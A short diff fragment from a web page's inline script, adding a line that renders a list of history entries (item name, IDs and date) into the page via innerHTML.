+  list.innerHTML = h.map(o => `<div class="history-item"><b>${o.item}</b><br>ID: ${o.gid}(${o.sid})<br><small style="color:#666">${o.date}</small></div>`).join('');  
 }  
 </script>  
 </body>  
